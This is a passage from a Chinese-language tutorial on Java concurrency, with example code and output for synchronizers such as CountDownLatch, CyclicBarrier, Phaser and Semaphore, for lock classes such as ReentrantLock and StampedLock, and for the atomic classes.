&#125;&#125;\n\nABA问题的解决方案java中的java.util.concurrent.atomic包下提供了AtomicStampedReference类和AtomicMarkableReference类来解决ABA问题。\n区别是：\n\nAtomicStampedReference使用的是int类型的stamp，可以区分每一次的修改\nAtomicMarkableReference使用的是boolean类型的mark，只能判断有没有修改过\n\n实现源码：\n\nAtomicStampedReference：在CAS的基础上增加了stamp\n/*Params:    expectedReference – the expected value of the reference     newReference – the new value for the reference     expectedStamp – the expected value of the stamp     newStamp – the new value for the stamp*/public boolean compareAndSet(V expectedReference,                             V newReference,                             int expectedStamp,                             int newStamp) &#123;    Pair&lt;V&gt; current = pair;    return        expectedReference == current.reference &amp;&amp;        expectedStamp == current.stamp &amp;&amp;        ((newReference == current.reference &amp;&amp;          newStamp == current.stamp) ||         casPair(current, Pair.of(newReference, newStamp)));&#125;\n\nAtomicMarkableReference：在CAS的基础上增加了mark\n/*Params:    expectedReference – the expected value of the reference     newReference – the new value for the reference     expectedMark – the expected value of the mark     newMark – the new value for the mark*/public boolean compareAndSet(V expectedReference,                             V newReference,                             boolean expectedMark,                             boolean newMark) &#123;    Pair&lt;V&gt; current = pair;    return        expectedReference == current.reference &amp;&amp;        expectedMark == current.mark &amp;&amp;        ((newReference == current.reference &amp;&amp;          newMark == current.mark) ||         casPair(current, Pair.of(newReference, newMark)));&#125;\n\n并发工具类并发工具类是一组用于帮助管理多线程并发操作的类，它们提供了例如线程同步、线程通信和控制线程执行的顺序等功能。\nCountDownLatchCountDownLatch能够实现一个或多个线程，等待其它所有线程完成某种操作后再执行。\n实现原理：CountDownLatch是基于AQS实现的，调用CountDownLatch的await方法的线程，会被加入到AQS的阻塞队列中等待；内部维护了一个计数器，记录未完成某种操作的线程数量，随构造函数传入初始值，调用countDown方法时计数器的值减1，当计数器的值减到0时，阻塞队列中的线程会被唤醒。CountDownLatch的计数器值不能被重置。\n使用示例：\npublic class CountDownLatchArrivalTask implements Runnable &#123;    private final String name;    private final CountDownLatch countDownLatch;    public CountDownLatchArrivalTask(String name, CountDownLatch countDownLatch) &#123;        this.name = name;        this.countDownLatch = countDownLatch;    &#125;    //线程执行countDown()方法使CountDownLatch的计数器减1    @Override    public void run() &#123;        System.out.println(name + &quot; has arrived.&quot;);        countDownLatch.countDown();    &#125;&#125;\n\npublic class CountDownLatchWaitingTask implements Runnable &#123;    private String name;    private CountDownLatch countDownLatch;    public CountDownLatchWaitingTask(String name, CountDownLatch countDownLatch) &#123;        this.name = name;        this.countDownLatch = countDownLatch;    &#125;    @Override    public void run() &#123;        try &#123;            System.out.println(name + &quot; is waiting for tourists.&quot;);            //等待其它线程执行完毕的才继续执行            countDownLatch.await();            System.out.println(&quot;The tour can begin.&quot;);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;\n\npublic class CountDownLatchTest &#123;    public static void main(String[] args) &#123;        CountDownLatch countDownLatch = new CountDownLatch(2);        //等待线程        new Thread(new CountDownLatchWaitingTask(&quot;Tourist guide&quot;, countDownLatch)).start();        //被等待线程        new Thread(new CountDownLatchArrivalTask(&quot;Tourist Amy&quot;, countDownLatch)).start();        new Thread(new CountDownLatchArrivalTask(&quot;Tourist Sam&quot;, countDownLatch)).start();    &#125;&#125;/**运行输出：Tourist Amy has arrived.Tourist guide is waiting for tourists.Tourist Sam has arrived.The tour can begin.*///&quot;The tour can begin.&quot;总是最后执行\n\n在这个例子中，有一个旅游团的导游和两个游客（CountDownLatch对象的计数器被初始化为2），导游需要等待所有游客到达（导游线程调用await方法）后才开始旅游，每个游客线程在到达后会调用countDown()方法来减少CountDownLatch对象的计数器，当计数器值减为0，await之后的代码继续执行。\nCyclicBarrierCyclicBarrier的功能是对CountDownLatch工具类的增强。CyclicBarrier的计数器可以被自动重置（在计数器减为0后，会自动重置为创建CyclicBarrier对象时的初始值），还能够实现多个线程之间互相的计数等待。\n构造CyclicBarrier时，除了可以传入计数器的初始值，还可以传入一个实现了Runnable接口的类对象（有两种构造器），当计数器值减为0时，会自动调用Runnale接口对象的run方法。\n使用示例：\npublic class CyclicBarrierTask implements Runnable &#123;    private final String task;    private final CyclicBarrier cyclicBarrier;    public CyclicBarrierTask(String task, CyclicBarrier cyclicBarrier) &#123;        this.task = task;        this.cyclicBarrier = cyclicBarrier;    &#125;    @Override    public void run() &#123;        //模拟了三个任务        IntStream.rangeClosed(1, 3).forEach((i) -&gt; &#123;            try &#123;                System.out.println(&quot;完成&quot; + task + &quot;的操作；&quot;);                cyclicBarrier.await();            &#125; catch (InterruptedException | BrokenBarrierException e) &#123;                throw new RuntimeException(e);            &#125;        &#125;);    &#125;&#125;\n\npublic class CyclicBarrierTest &#123;    public static void main(String[] args) throws InterruptedException &#123;        CyclicBarrier cyclicBarrier = new CyclicBarrier(2, () -&gt; &#123;            System.out.println(&quot;当前提交订单、扣减库存完成&quot;);        &#125;);        //提交订单和扣减库存的操作会互相等待，共同执行完毕才进入下一个CyclicBarrier        new Thread(new CyclicBarrierTask(&quot;提交订单&quot;, cyclicBarrier)).start();        new Thread(new CyclicBarrierTask(&quot;扣减库存&quot;, cyclicBarrier)).start();    &#125;&#125;/**输出结果：完成提交订单的操作；完成扣减库存的操作；当前提交订单、扣减库存完成完成扣减库存的操作；完成提交订单的操作；当前提交订单、扣减库存完成完成提交订单的操作；完成扣减库存的操作；当前提交订单、扣减库存完成*/\n\n在这个例子中，模拟了三个任务，每个任务都分别包含提交订单、扣减库存两个操作。如果使用CyclicBarrier，则只需要创建一个CyclicBarrier对象，每个任务执行完毕后CyclicBarrier会自动重置计数器的值，继续执行下一个任务。\nPhaserPhaser的功能类似于CountDownLatch和CyclicBarrier的集合。Phaser适用于将一个大任务拆分为多个小任务，拆分后的每个小任务都可以并发执行，且上一个大任务完成才可以执行下一个大任务。这种场景使用CountDownLatch和CyclicBarrier也能实现，但是使用Phaser会更灵活。\n使用示例：\npublic class PhaserDinner extends Phaser &#123;    @Override    protected boolean onAdvance(int phase, int registeredParties) &#123;        //return if this phaser should terminate        return switch (phase) &#123;            case 0 -&gt; allArrive();            case 1 -&gt; allOrderedMeal();            case 2 -&gt; allOrderedDrink();            default -&gt; true;        &#125;;    &#125;    private boolean allOrderedDrink() &#123;        System.out.println(&quot;所有人都点完了饮料&quot;);        return false;    &#125;    private boolean allOrderedMeal() &#123;        System.out.println(&quot;所有人都点完了菜&quot;);        return false;    &#125;    private boolean allArrive() &#123;        System.out.println(&quot;所有人都到齐了&quot;);        return false;    &#125;&#125;\n\npublic class PhaserTask implements Runnable&#123;    private final String name;    private final Phaser phaser;    private final String meal;    private final String drink;    public PhaserTask(String name, Phaser phaser, String meal, String drink) &#123;        this.name = name;        this.phaser = phaser;        this.meal = meal;        this.drink = drink;    &#125;    //定义了每个阶段（大任务）要执行的任务（小任务），不同阶段使用arriveAndAwaitAdvance()分隔    @Override    public void run() &#123;        //到达聚餐地点        System.out.println(name + &quot;到达聚餐地点&quot;);        phaser.arriveAndAwaitAdvance(); //等待其它线程到达        //点菜        System.out.println(name + &quot;点了一份&quot; + meal);        phaser.arriveAndAwaitAdvance();        //点饮料        System.out.println(name + &quot;点了一份&quot; + drink);        phaser.arriveAndAwaitAdvance();    &#125;&#125;\n\npublic class PhaserTest &#123;    public static void main(String[] args) &#123;        PhaserDinner phaserDinner = new PhaserDinner();        new Thread(new PhaserTask(&quot;Amy&quot;, phaserDinner, &quot;hamburg&quot;, &quot;cola&quot;)).start();        //向Phaser对象注册线程        phaserDinner.register();        new Thread(new PhaserTask(&quot;Sam&quot;, phaserDinner, &quot;sandwich&quot;, &quot;coffee&quot;)).start();        phaserDinner.register();    &#125;&#125;/**输出结果：Amy到达聚餐地点Sam到达聚餐地点所有人都到齐了Amy点了一份hamburgSam点了一份sandwich所有人都点完了菜Sam点了一份coffeeAmy点了一份cola所有人都点完了饮料*/\n\n在这个例子中，场景是等待所有人到达后点菜，所有人点完菜后点饮料，要开启下一阶段（到达 -&gt; 点菜 -&gt; 点饮料），需要所有线程都完成上一阶段。PhaserTask类定义了整个阶段里每个阶段的任务，阶段之间使用phaser.arriveAndAwaitAdvance()等待所有线程执行完之前的代码，PhaserDinner类是Phaser接口的实现类，覆盖了onAdvance方法，定义了每个阶段完成后执行的操作以及返回是否继续使用Phaser（Phaser是否继续生效）。\nSemaphoreSemaphore可以限制同时访问某一资源的线程数量，相当于一个共享锁，允许多个线程同时拥有一定数量的信号量许可（permits）。\nSemaphore提供了公平信号量与非公平信号量两种模式。\n使用示例：\npublic class SemaphoreTask implements Runnable&#123;    private final Semaphore semaphore;    public SemaphoreTask(Semaphore semaphore) &#123;        this.semaphore = semaphore;    &#125;    @Override    public void run() &#123;        try &#123;            //获取信号量许可            semaphore.acquire();            //获得许可，继续执行            DateTimeFormatter formatter = DateTimeFormatter.ofPattern(&quot;HH:mm:ss&quot;);            System.out.println(Thread.currentThread().getName() + &quot; 获取到许可，执行时间为 &quot; + LocalTime.now().format(formatter));            Thread.sleep(2000);            //释放许可            semaphore.release();        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;\n\npublic class SemaphoreTest &#123;    public static void main(String[] args) &#123;        //创建了一个信号量许可数量为2的非公平的Semaphore对象        Semaphore semaphore = new Semaphore(2);        int threadNum = 6;        //创建一个固定大小的线程池        ExecutorService threadPool = Executors.newFixedThreadPool(threadNum);        //提交任务        IntStream.range(0, threadNum).forEach((i) -&gt; &#123;            threadPool.submit(new SemaphoreTask(semaphore));        &#125;);    &#125;&#125;/**输出结果：pool-1-thread-2 获取到许可，执行时间为 10:40:52pool-1-thread-4 获取到许可，执行时间为 10:40:52pool-1-thread-6 获取到许可，执行时间为 10:40:54pool-1-thread-1 获取到许可，执行时间为 10:40:54pool-1-thread-3 获取到许可，执行时间为 10:40:56pool-1-thread-5 获取到许可，执行时间为 10:40:56*/\n\n在这个例子中，创建了一个信号量许可数量为2的非公平的Semaphore对象，和一个线程数为6的线程池，线程执行的是SemaphoreTask类实现的run方法，run方法中有一个两秒钟的睡眠，从输出结果中可以看到，每两秒的时间内只有两个线程能够执行。\nExchangerExchanger能够实现两个线程之间的数据交换。当一个线程调用了Exchanger对象的exchange方法，就会进入阻塞状态，直到另一个线程也调用了同一个Exchanger对象的exchange方法后，两个线程会交换数据，然后继续执行。\n使用示例：\npublic class ExchangerTask&lt;T&gt; implements Runnable &#123;    Exchanger&lt;T&gt; exchanger;    T object;    public ExchangerTask(Exchanger&lt;T&gt; exchanger, T object) &#123;        this.exchanger = exchanger;        //要交换的数据        this.object = object;    &#125;    @Override    public void run() &#123;        try &#123;            //调用Exchanger对象的exchange方法，进行数据交换            T getFromExchanger = exchanger.exchange(object);            //输出线程执行完毕的时间            DateTimeFormatter formatter = DateTimeFormatter.ofPattern(&quot;HH:mm:ss&quot;);            System.out.println(getFromExchanger.toString() + &quot;完成的时间为 &quot; + LocalTime.now().format(formatter));        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;\n\npublic class ExchangerTest &#123;    public static void main(String[] args) throws InterruptedException &#123;        //创建Exchanger对象        Exchanger&lt;String&gt; exchanger = new Exchanger&lt;&gt;();        //先启动了付款线程        new Thread(new ExchangerTask&lt;&gt;(exchanger, &quot;付款&quot;)).start();        //在付款和交付之间加入时间间隙，看付款时间和交付时间是否一致，以验证Exchanger的作用        Thread.sleep(2000);        //两秒后启动交付线程        new Thread(new ExchangerTask&lt;&gt;(exchanger, &quot;交付&quot;)).start();    &#125;&#125;/**输出结果：付款完成的时间为 11:54:54交付完成的时间为 11:54:54*/\n\n在这个示例中，使用了两个线程模拟了商品付款的交付的过程，使用了Exchanger实现了线程间的等待和数据交换。虽然付款线程最先启动，两秒后才启动交付线程，但是由于Exchanger的exchange机制，实现了两个线程共同执行完exchange，交换完毕数据之后，才继续后续任务。\n锁工具类锁工具类是用于实现线程同步和互斥访问的工具。它们提供了一种机制，允许线程对共享资源进行独占访问，以确保数据的一致性和正确性。\nLock接口Lock接口是Java从1.5版本开始提供的显示锁接口。位于java.util.concurrent.locks包下：\n\nLock接口声明了以下方法：\n\nvoid lock()：无条件地获取锁。如果锁不可用，则当前线程会被阻塞，直到获取到锁为止。\n\nvoid lockInterruptibly() throws InterruptedException：获取锁，但是允许响应中断。如果锁不可用，当前线程会进入阻塞状态，直到获取到锁或者当前线程被中断。\n\nboolean tryLock()：尝试获取锁，如果锁可用，则立即获取锁，并返回true。如果锁不可用，则立即返回false，而不会阻塞当前线程。\n\nboolean tryLock(long time, TimeUnit unit) throws InterruptedException：在给定的时间范围内尝试获取锁。如果在指定时间内获取到锁，则返回true，否则返回false。如果获取锁超时，当前线程可能会被阻塞，直到获取到锁或者超时时间到达。\n\nvoid unlock()：释放锁。必须在获取锁之后才能调用此方法，否则会抛出IllegalMonitorStateException异常。\n\nCondition newCondition()：获取与锁关联的条件对象。可以使用条件对象进行线程的等待和通知。\n\n\n\nCondition接口使用Condition接口的wait、signal和signalAll方法结合Lock锁使用可以实现线程间的等待与通知（即线程间的通信）。这种功能类似使用Java的Object类提供的wait、notify和notifyAll方法结合synchronized实现对象的等待和通知，如：\n//Object类提供的wait、notify和notifyAll方法必须结合synchronized，才能实现对象的等待和通知private final Object obj = new Object();public void testWait() throws InterruptedException &#123;    synchronized(obj) &#123;        obj.wait();    &#125;&#125;public void testNotify() &#123;    synchronized (obj) &#123;        obj.notify();    &#125;&#125;public void testNotifyAll() &#123;    synchronized (obj) &#123;        obj.notifyAll();    &#125;&#125;\n\n在使用Condition接口时，不会直接创建Condition接口的对象，而是通过Lock接口的newCondition()方法创建。调用Lock锁对象的newCondition()方法就能够生成与当前Lock锁绑定的Condition对象，然后使用Condition对象就可以实现线程的等待与通知机制。\n使用示例：\npublic class ConditionTask implements Runnable &#123;    private Lock lock;    private Condition condition;    public ConditionTask(Lock lock, Condition condition) &#123;        this.lock = lock;        this.condition = condition;    &#125;    @Override    public void run() &#123;        lock.lock();        try &#123;            System.out.println(&quot;线程进入等待&quot;);            //线程等待            condition.await();            System.out.println(&quot;线程被唤醒&quot;);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125; finally &#123;            lock.unlock();        &#125;    &#125;&#125;\n\npublic class ConditionTest &#123;    public static void main(String[] args) throws InterruptedException &#123;        Lock lock = new ReentrantLock();        Condition condition = lock.newCondition();        new Thread(new ConditionTask(lock, condition)).start();        Thread.sleep(1000);        //主线程获取锁        lock.lock();        try &#123;            System.out.println(&quot;唤醒等待的线程&quot;);            //线程唤醒            condition.signal();            Thread.sleep(1000);            System.out.println(&quot;唤醒等待的线程结束&quot;);        &#125; finally &#123;            lock.unlock();        &#125;    &#125;&#125;/**线程进入等待唤醒等待的线程唤醒等待的线程结束线程被唤醒*/\n\n在这个例子中，创建了一个执行condition.await()进入等待状态的线程，使用主线程执行condition.signal()唤醒等待的线程，主线程释放锁后进入等待状态的线程成功地被唤醒。\nLock锁Lock锁相比synchronized的优势Lock锁（继承了Lock接口的锁工具类的统称）比synchronized锁更灵活，表现在：\n\nLock锁中的ReadWriteLock可以实现读读不互斥（共享锁），而synchronized只支持独占锁。\nLock锁可以实现在没有获取到锁的情况下直接返回，而synchronized只支持阻塞。\nLock锁支持超时机制，而synchronized只支持阻塞。\nLock锁支持可中断，而synchronized为不可中断的锁。\nLock锁支持公平锁，而synchronized只支持非公平锁。\n\nLock锁的使用方法Lock锁的使用方法是，首先创建一个Lock对象，调用加锁方法进行加锁，然后在try代码块中实现业务代码，在catch代码块中处理异常，最后在finally代码块中释放锁资源。\nlock.lock()是写在try里面还是外面：\n在使用 Lock 的时候，通常建议将 lock.lock(); 写在 try 块的外面，然后在 finally 块中释放锁。例如：\nLock lock = new ReentrantLock();lock.lock();try &#123;    // access shared resources&#125; finally &#123;    lock.unlock();&#125;\n\n这样做的原因是，如果获取锁（lock.lock()）失败抛出了异常，那么在 finally 块中就无需（也不能）去释放这个锁。如果将 lock.lock(); **如果写在 try 块内部，当获取锁失败时，finally 块仍然会执行，这可能会导致尝试释放一个实际上并未被当前线程持有的锁，从而引发 IllegalMonitorStateException**。\n然而，需要注意的是，这种模式主要适用于 lock.lock() 不会抛出受检异常的情况。在 Lock 接口中，lock() 方法正是不会抛出受检异常的。但如果使用的锁实现会在 lock() 方法中抛出受检异常，那么就需要将 lock() 调用放入 try 块中，并在 catch 块中适当地处理异常。\n使用示例：\npublic class LockTask implements Runnable &#123;    //Lock锁    Lock lock;    public LockTask(Lock lock) &#123;        this.lock = lock;    &#125;    @Override    public void run() &#123;        //加锁        lock.lock();        try &#123;            //获取到锁            System.out.println(Thread.currentThread().getName() + &quot;线程获取到锁&quot;);            System.out.println(Thread.currentThread().getName() + &quot;线程执行任务&quot;);        &#125; finally &#123;            System.out.println(Thread.currentThread().getName() + &quot;线程释放锁&quot;);            //解锁            lock.unlock();        &#125;    &#125;&#125;\n\npublic class LockTest &#123;    public static void main(String[] args) &#123;        Lock lock = new ReentrantLock();        IntStream.range(0, 5).forEach((i) -&gt; &#123;            new Thread(new LockTask(lock)).start();        &#125;);    &#125;&#125;/**输出结果：Thread-0线程获取到锁Thread-0线程执行任务Thread-0线程释放锁Thread-2线程获取到锁Thread-2线程执行任务Thread-2线程释放锁Thread-4线程获取到锁Thread-4线程执行任务Thread-4线程释放锁Thread-3线程获取到锁Thread-3线程执行任务Thread-3线程释放锁Thread-1线程获取到锁Thread-1线程执行任务Thread-1线程释放锁*/\n\n在这个例子中，创建了一个Runnable的实现类LockTask，LockTask中使用了Lock锁，确保了run方法中打印的顺序是以线程为单位的，同一时刻只有一个线程能访问临界区资源，并完整地执行完获取锁和释放锁。\n锁概念\n隐式锁和显示锁\nsynchronized是隐式锁，Lock锁是显示锁。\n\n当调用synchronized修饰的代码时，并不需要显示的加锁和解锁的过程，所以称之为隐式锁。\n而Lock锁都是手动写代码去获取锁和释放锁的，所以也叫显示锁。\n\n\n独占锁和共享锁\n按照加锁后的资源能否在被多个线程访问，可以将锁分为独占锁和共享锁\n\n线程获取到独占锁后，其他线程如果想要获取该锁，只能等待。\n线程获取到共享锁后，其他线程也可以获取到该锁，但是共享锁只允许对临界区的数据进行读取操作，不允许修改。也就是说，共享锁是针对读操作的锁。\n\n\n公平锁和非公平锁\n\n公平锁中的线程在抢占锁时首先会判断等待队列是否为空，如果队列为空或者当前线程是队列的队首元素，则当前线程获取到锁资源，否则会被放入队列尾部等待获取锁。\n\n非公平锁中的线程在抢占锁时会先直接尝试抢占锁，如果抢占成功就继续执行程序的业务逻辑，如果抢占失败，才会进入等待队列中等待。\n\n\n\n悲观锁和乐观锁\nsynchronized锁就是悲观锁，java.util.concurrent.atomic包下的原子类是乐观锁。\n\n悲观锁的核心思想是对数据是否被修改持有悲观态度，认为其他线程会修改数据，所以在线程每次获取数据时都会加锁。\n\n乐观锁的核心思想是对数据是否被修改持有乐观态度，认为其他线程不会修改数据，所以在线程每次获取数据时都不会加锁。乐观锁适合读多写少的场景。\n\n\n\n可中断锁和不可中断锁\nsynchronized锁是不可中断锁，只能在抢占锁成功后被中断，不能在抢占锁的过程中被中断。ReentrantLock是可中断锁。ReentrantLock支持两种可中断锁的使用方式，lockInterruptibly和tryLock，如果当前线程在抢占锁的过程中被中断，就会抛出InterruptedException。\n\n可中断锁指在多个线程抢占锁的过程中可以被中断的锁。\n不可中断锁指在多个线程抢占的过程中不可以被中断的锁。\n\n\n\nReentrantLockReentrantLock是Java提供的一种可重入锁，一个线程可以多次通过ReentrantLock的lock()方法获取锁，所以要完全释放锁，必须要调用相同次数的unlock()释放锁的方法。底层的实现是，每获取一次锁，计数器就会加1，当线程释放锁时，重入的计数就会减少1。只有当重入的计数变为0时，锁才会真正被释放。\nReentrantLock支持公平和非公平两种模式。底层是ReentrantLock通过内部的两个抽象类，FairSync和NonfairSync，实现的。FairSync和NonfairSync分别表示公平锁和非公平锁模式，两者都继承了Sync类，而Sync类继承了AQS，所以ReentrantLock是基于AQS实现的。\n使用示例：\npublic class ReentrantLockTask implements Runnable &#123;    private Lock lock;    public ReentrantLockTask(Lock lock) &#123;        this.lock = lock;    &#125;    @Override    public void run() &#123;        lock.lock();        String threadName = Thread.currentThread().getName();        System.out.println(threadName + &quot;线程第一次加锁&quot;);        //锁重入        lock.lock();        System.out.println(threadName + &quot;线程第二次加锁&quot;);        try &#123;            System.out.println(threadName + &quot;线程使用临界区资源&quot;);        &#125; finally &#123;            System.out.println(threadName + &quot;线程第一次解锁&quot;);            lock.unlock();            System.out.println(threadName + &quot;线程第二次解锁&quot;);            lock.unlock();        &#125;    &#125;&#125;\n\npublic class ReentrantLockTest &#123;    public static void main(String[] args) &#123;        ReentrantLock lock = new ReentrantLock();        IntStream.range(0, 2).forEach((i) -&gt; &#123;            new Thread(new ReentrantLockTask(lock)).start();        &#125;);    &#125;&#125;/**Thread-0线程第一次加锁Thread-0线程第二次加锁Thread-0线程使用临界区资源Thread-0线程第一次解锁Thread-0线程第二次解锁Thread-1线程第一次加锁Thread-1线程第二次加锁Thread-1线程使用临界区资源Thread-1线程第一次解锁Thread-1线程第二次解锁*/\n\n在这个例子中，在ReentrantLockTask的run方法中演示了ReentrantLock的锁重入的使用方法。\nReadWriteLock接口ReadWriteLock是Java提供的一种读写锁，ReadWriteLock锁声明了两个方法，分别用于获取读锁和写锁。\n读写锁：\n\n共享锁（读锁）：读共享\n排他锁（写锁）：写互斥\n\nReentrantReadWriteLockReentrantReadWriteLock是从Java1.5开始提供的ReadWriteLock的实现类。ReentrantReadWriteLock内部实现了读锁和写锁类，分别是ReadLock和WriteLock。使用ReentrantReadWriteLock对象可以获取读锁和写锁。\nReentrantReadWriteLock也支持公平锁和非公平锁，底层也是通过ReentrantReadWriteLock内部的两个抽象类FairSync和NonfairSync实现的，所以也是基于AQS实现的。\nReentrantReadWriteLock支持锁降级，即获取写锁的线程可以获取读锁，锁降级后锁的级别会从写锁降为读锁。\n使用示例：\npublic class ReadWriteLockTest &#123;    private ReadWriteLock readWriteLock = new ReentrantReadWriteLock();    private Lock readLock = readWriteLock.readLock();    private Lock writeLock = readWriteLock.writeLock();    public void read() &#123;        readLock.lock();        try &#123;            System.out.println(Thread.currentThread().getName() + &quot;线程获取到读锁&quot;);            Thread.sleep(500);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125; finally &#123;            System.out.println(Thread.currentThread().getName() + &quot;线程释放读锁&quot;);            readLock.unlock();        &#125;    &#125;    public void write() &#123;        writeLock.lock();        try &#123;            System.out.println(Thread.currentThread().getName() + &quot;线程获取到写锁&quot;);            Thread.sleep(500);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125; finally &#123;            System.out.println(Thread.currentThread().getName() + &quot;线程释放写锁&quot;);            writeLock.unlock();        &#125;    &#125;    public static void main(String[] args) throws InterruptedException &#123;        ReadWriteLockTest readWriteLockTest = new ReadWriteLockTest();        IntStream.range(0, 3).forEach((i) -&gt; &#123;            //以方法引用的方式传递任务            new Thread(readWriteLockTest::read).start();        &#125;);        Thread.sleep(1000);        IntStream.range(0, 3).forEach((i) -&gt; &#123;            new Thread(readWriteLockTest::write).start();        &#125;);    &#125;&#125;/**输出结果：Thread-0线程获取到读锁Thread-1线程获取到读锁Thread-2线程获取到读锁Thread-0线程释放读锁Thread-1线程释放读锁Thread-2线程释放读锁Thread-3线程获取到写锁Thread-3线程释放写锁Thread-5线程获取到写锁Thread-5线程释放写锁Thread-4线程获取到写锁Thread-4线程释放写锁*/\n\n在这个例子中，创建了一个ReentrantReadWriteLock类的对象，并由这个对象获取到读锁跟写锁，分别开启多个使用读锁的线程和使用写锁的线程，可以看到看到读锁同一时刻可以被多个线程获取，验证了ReentrantReadWriteLock的读锁是共享的，可以看到写锁同一时刻只能被一个线程获取，线程释放写锁后其它线程才有机会获取，验证了ReentrantReadWriteLock的写锁是互斥的。\nStampedLockStampedLock是从Java1.8开始提供的读写锁，支持读锁（悲观读）、写锁、乐观读（OptimisticRead）。只支持非公平锁。不支持重入。支持锁的升级和降级。\nStampedLock在获取读锁和写锁成功后都会返回一个Long型的返回值，在释放锁时需要传入这个返回值。\nStampedLock的乐观读：乐观读不加锁，使用乐观读期间允许获取写锁并执行写入操作，在读取之前会获取数据的版本号，读取完成后，通过validate()方法去验证版本号，如果版本号不变，则说明在读取过程中没有发生数据修改，否则说明发生了数据修改，就需要将乐观读升级为悲观读。\n使用示例：\npublic class StampedLockTest &#123;    //共享变量（临界区资源）    private int count = 0;    //StampedLock锁    private final StampedLock stampedLock = new StampedLock();    public void write() &#123;        long stamp = stampedLock.writeLock();        System.out.println(Thread.currentThread().getName() + &quot;写线程修改共享变量的值开始&quot;);        try &#123;            count += 1;        &#125; finally &#123;            stampedLock.unlockWrite(stamp);        &#125;        System.out.println(Thread.currentThread().getName() + &quot;写线程修改共享变量的值结束&quot;);    &#125;    public void optimisticRead() &#123;        long stamp = stampedLock.tryOptimisticRead();        System.out.println(Thread.currentThread().getName() + &quot;检测共享变量是否被修改（没有被修改为true，被修改为false）：&quot; + stampedLock.validate(stamp));        try &#123;            TimeUnit.SECONDS.sleep(2);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;        System.out.println(Thread.currentThread().getName() + &quot;线程休眠两秒后再次检测共享变量的值是否被修改（没有被修改为true，被修改为false）：&quot; + stampedLock.validate(stamp));        int result = count;        if (!stampedLock.validate(stamp)) &#123;            System.out.println(&quot;共享变量的值被修改，说明乐观读期间也允许获取写锁&quot;);            //将乐观锁升级为悲观锁            stamp = stampedLock.readLock();            try &#123;                System.out.println(Thread.currentThread().getName() + &quot;线程将乐观读升级为悲观读&quot;);                result = count;                System.out.println(Thread.currentThread().getName() + &quot;线程从乐观读升级为悲观读后的共享变量的值：&quot; + result);            &#125; finally &#123;                stampedLock.unlockRead(stamp);            &#125;        &#125;        System.out.println(Thread.currentThread().getName() + &quot;线程读取到的最终的共享变量的值：&quot; + result);    &#125;    public static void main(String[] args) throws InterruptedException &#123;        StampedLockTest stampedLockTest = new StampedLockTest();        new Thread(stampedLockTest::optimisticRead).start();        TimeUnit.SECONDS.sleep(1);        System.out.println(&quot;一秒后启动写线程&quot;);        new Thread(stampedLockTest::write).start();    &#125;&#125;/**Thread-0检测共享变量是否被修改（没有被修改为true，被修改为false）：true一秒后启动写线程Thread-1写线程修改共享变量的值开始Thread-1写线程修改共享变量的值结束Thread-0线程休眠两秒后再次检测共享变量的值是否被修改（没有被修改为true，被修改为false）：false共享变量的值被修改，说明乐观读期间也允许获取写锁Thread-0线程将乐观读升级为悲观读Thread-0线程从乐观读升级为悲观读后的共享变量的值：1Thread-0线程读取到的最终的共享变量的值：1*/\n\n在这个例子中，使用validate方法检测变量是否被修改，首先启动了乐观读线程，一秒后启动写线程，启动写线程后虽然乐观读线程没有退出，但是再次读取时可以检测到变量值被改变，说明乐观读期间也允许获取写锁。使用乐观读时如果检测到变量值修改了，就需要将乐观读升级为悲观读。\n无锁原子类无锁原子类全部位于java.util.concurrent.atomic包下：\n\n\n基本类型原子类\n包括：AtomicInteger、AtomicLong、AtomicBoolean。\n基本类型的原子类只能操作Java的基本类型数据，并且只能更新单个基本类型的变量。\nAtomicInteger类的用法示例：\nAtomicInteger atomicInteger = new AtomicInteger(); //创建原子类atomicInteger.incrementAndGet(); //加1int num = atomicInteger.get(); // get值\n\n引用类型原子类\n包括：AtomicReference、AtomicStampedReference、AtomicMarkableReference。\n这些引用类型原子类都是使用了泛型。\n如果要同时操作多个变量，或者更新一个对象的多个属性，就需要使用引用类型原子类。\n其中，AtomicReference是最基础的引用类型原子类，AtomicStampedReference是带有stamp戳记的引用原子类，AtomicMarkableReference是带有mark标志的引用原子类。\n\n字段类型原子类\n包括：AtomicIntegerFieldUpdater、AtomicLongFieldUpdater、AtomicReferenceFieldUpdater。\n如果只是想更新对象中的某个字段，则可以使用Java中专门操作字段类型的原子类作为字段类型。\n使用字段类型原子类时，需要先调用各自类的newUpdater()方法来指定要更新的类和字段名称，如果使用的是AtomicReferenceFieldUpdater还需要指定字段的类型。\n使用操作字段类型的原子类更新某个类中的字段时，部分类型的变量下不能实现原子性地更新：\n\n类的静态变量\n父类的成员变量\n不能被直接访问类的成员变量\n被final关键字修饰类的成员变量\n没有使用volatile关键字修饰的类的成员变量\n\n\n数组类型原子类\n包括：AtomicIntegerArray、AtomicLongArray、AtomicReferenceArray。\n\n累加器类型原子类\n包括：DoubleAccumulator、DoubleAddr、LongAccumulator、LongAddr。\n优化原理：为减少大量线程竞争资源，进行CAS更新变量时大量失败的现象，Java1.8中提供了累加器类型原子类，通过将一个变量分解为多个变量，让多个线程竞争同一资源的情况转变为多个线程竞争多个资源，提升了性能。\nXxxAccumulator的功能比XxxAddr多，表现在：\n\nXxxAccumulator的初始值可以自定义\nXxxAccumulator的运算规则可以自定义\n\n累加器类型原子类的变量更新机制：使用累加器类型原子类更新变量时会维护一个Cell类型的数组，每个Cell类型的元素内部会维护一个double类型或者long类型的变量，初始值为0，线程会竞争数组中多个Cell类型的元素，如果一个线程竞争某个元素失败，不会在该元素上进行CAS自旋，而是会尝试对其它元素进行CAS操作。在获取累加器类型原子类的变量值时，会将Cell数组中的所有元素的value值进行累加，再加上base变量的值后得到结果并返回。\n在Cell类的定义上有@jdk.internal.vm.annotation.Contended注解，解决伪共享问题，提高性能。\n\n@jdk.internal.vm.annotation.Contended 是 Java 中的一个注解，它的作用是用于解决伪共享（False 